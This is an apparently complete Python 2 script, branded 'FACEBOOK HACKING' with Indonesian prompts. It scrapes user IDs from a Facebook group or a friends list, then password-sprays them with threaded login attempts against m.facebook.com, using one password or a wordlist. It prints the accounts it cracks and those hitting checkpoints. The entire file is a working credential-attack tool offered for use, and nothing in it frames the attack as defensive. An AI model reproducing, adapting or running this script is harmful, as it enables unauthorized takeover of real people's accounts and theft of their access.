from __future__ import print_function
import platform,os
def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('\rm[!] Kamu Menggunakan Python Versi %s Silahkan Menggunakan Versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm[!]SepertiNya Module \rbMechanize\rm Belum Di Install...')
	tampil('\rmpip2 install mechanize...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]BY~~~HaxID')
	os.sys.exit()
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/FBHgroup.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/FBHteman.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('\n\rm[!]Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm[!]Lol, Masukan Pilihannya Bro...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Lol, Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('\rm[!]Pilihan Tidak Tersedia')
			continue
		if i in d:
			break
		else:
			tampil('\rm[!]Pilihan Tidak Tersedia')
	return i
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Menyimpan Hasil Dari group')
		try:
			open(os.sys.path[0]+'/FBHgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rp[!]Berhasil meyimpan \rcFBHgroup.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
	if len(id_bteman) != 0:
		tampil('\rp[*]Menyimpan Daftar Teman...')
		try:
			open(os.sys.path[0]+'/FBHteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rp[!]Berhasil meyimpan \rcFBHteman.txt')
		except:
			tampil('\rm[!]Gagal Meyimpan')
def buka(d):
	tampil('\rb[*]Membuka \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm[!]Gagal membuka \rp'+d)
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?]Email/HP')
	pa = inputD('[?]Password')
	tampil('\rp[*]Loading....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rp[*]Login Berhasil')
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rb[*]Selamat datang \rk%s\n\rp[*]Semoga Berhasil....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun Kena Checkpoint\n\rp[!]Coba Login dengan Browser')
		keluar()
	else:
		tampil('\rm[!]Login Gagal')
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
		tampil('\rc==>\rb%s\rm'%i)
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		if i.find('profile.php') == -1:
			a = i.replace('?','')
		else:
			a = i.replace('profile.php?id=','').replace('&amp;','')
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a)
			id_bgroup.append(a)
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Group')
		tampil('\rh[*]Mengecek Group....')
		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
			break
		except:
			tampil('\rm[!]Id Yang Anda Masukan Salah')
			continue
	tampil('\rp[*]Mengambil Id Dari Group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rp[*]Login dulu bos...')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
		except:
			tampil('\rm[!]Hanya Bisa Mengambil \rp %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def idteman():
	if log != 1:
		tampil('\rp[*]Login dulu bos...')
		login()
		if log == 0:
			keluar()
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex= 'friends_center_main').url
	except:
		if len(id_teman) != 0:
			tampil('\rm[!]Hanya Dapat Mengambil \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		try:
			next = br.find_link(url_regex= 'friends_center_main').url
		except:
			tampil('\rm[!]Hanya Dapat Mengambil \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
class mt(threading.Thread):
    def __init__(self,i,p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 3
        self.p = p
    def update(self):
        return self.a,self.id
    def run(self):
        try:
             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
        except KeyboardInterrupt:
            os.sys.exit()
        except:
            self.a = 8
            os.sys.exit()
        if 'm_sess' in data.url or 'save-device' in data.url:
            self.a = 1
        elif 'checkpoint' in data.url:
            self.a = 2
        else:
            self.a = 0
def crack(d):
	i = inputD('[?]Pake Password list/Manual (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]Masukan Alamat Wordlist')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil('\rm[!]Gagal membuka \rk%s'%dir)
				continue
			break
		tampil('\rp[*]Memulai Crack Dengan \rm%d Password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Mau coba lagi (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD('[?]Password'),1)
def crack0(data,sandi,p):
	tampil('\rp[*]MengCrack \rk%d Akun \rmDengan Password \rm[\rk%s\rm]'%(len(data),sandi))
	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		if len(i) != 0:th.append(mt(i,sandi))
	for i in th:
		jml1 += 1
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in akun_jml:
					jml0 += 1
					if a[0] == 2:
						akun_cekpoint.append(a[1])
					elif a[0] == 1:
						akun_sukses.append(a[1])
					elif a[0] == 0:
						akun_gagal.append(a[1])
					elif a[0] == 8:
						akun_error.append(a[1])
					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			keluar()
	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rp[*]Daftar Akun Sukses')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rp[*]Akun Berhasil\rp      %d'%len(akun_sukses))
	tampil('\rm[*]Akun Gagal\rp         %d'%len(akun_gagal))
	tampil('\rk[*]Akun Cekpoint\rp      %d'%len(akun_cekpoint))
	tampil('\rc[*]Akun Error\rp         %d'%len(akun_error))
	if p:
		i = inputD('[?]Mau coba lagi (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
	else:
		return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/FBHbteman.txt')
			fid_bteman = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/FBHbgroup.txt')
			fid_bgroup = []
	return 0


def menu():
	tampil('''\rh
          ___   ___   _  _   
         | __| | _ ) | || |  \rk*\rcAsecC|~|eror404
         | _|  | _ \ | __ |  
        _|_|_  |___/ |_||_|  
 \rp |"""""|| """ |\rmHaxID\rp|"""""||"""""| 
      "`-0-0-'"`-0-0-'"`-0-0-'   
      
\rmKita semua bangkit dan berdiri untuk suatu perubahan
\rk####################################################
             \rk*\rpFACEBOOK HACKING\rk*
             	\rp*\rkRombongan\rp*
             
 \rhAuthor :\rp Pirman\rkSX
 \rhMod    :\rp AsecC\rm|~|\rkeror404
 \rhTeam   :\rp Hax\rkID
 \rhContact:\rp sempakbasah\rk044@gmail.com
 
\rk####################################################
\rmNOTE:Sekali anda memahami, seribu kali anda mengerti''')

	tampil('''''')
	tampil('''\rb%s\n\rc1 \rcAmbil id dari group\n\rc2 \rcAmbil id dari daftar teman\n\rb%s'''%('+'*25,'+'*25))
	tampil('''\rk%s\n\rc3 \rmKeluar\n\rk%s'''%('+'*25,'+'*25))
	tampil('''''')
	i = inputM('FBH ==>',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
		lanjutT()
		idteman()
	elif i == 3:
		keluar()
bacaData()
menu()